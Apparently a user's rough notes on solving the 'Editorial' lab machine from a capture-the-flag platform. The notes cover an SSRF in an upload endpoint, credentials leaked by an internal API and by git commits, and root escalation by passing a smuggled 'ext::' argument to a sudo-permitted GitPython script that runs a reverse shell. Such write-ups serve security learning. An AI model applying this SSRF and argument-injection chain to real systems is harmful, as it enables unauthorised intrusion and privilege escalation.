___

# User

submissions@tiempoarriba.htb

fuzz subdomains


using the HUGO framework


-> did not find subs or any interesting dirs def missing something

why is this 200 ok

http://editorial.htb/?:

*endpoints*
/upload_cover
/upload

Hugo 0.104.2


*SSRF is present here, and theres also something here*
http://localhost:5000


*these 2 mails here*
      "contact_email_1": "soporte@tiempoarriba.oc",
      "contact_email_2": "info@tiempoarriba.oc",



*this endpoint found creds*
"endpoint": "/api/latest/metadata/messages/authors

{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}



Username: dev
Password: dev080217_devAPI!@

*logs in ssh*


*gotta get in this user / .git prob has creds???*
prod:x:1000:1000:Alirio Acosta:/home/prod:/bin/bash



syslog 
theres a socked and some services running as dev stuff like that ? maybe thats the way?
uid=107(syslog) gid=113(syslog) groups=113(syslog),4(adm)


    location / {
        include proxy_params;
        proxy_pass http://unix:/opt/apps/app_editorial/editorial.sock;
    }
}



*in commit messages found the pass for prod*

Username: prod
Password: 080217_Producti0n_2023!@



*this right here*
prod@editorial:~$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *



*i think like this*
https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858



*created a rev shell script and ran it like this*
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py ext::/home/prod/cool.sh



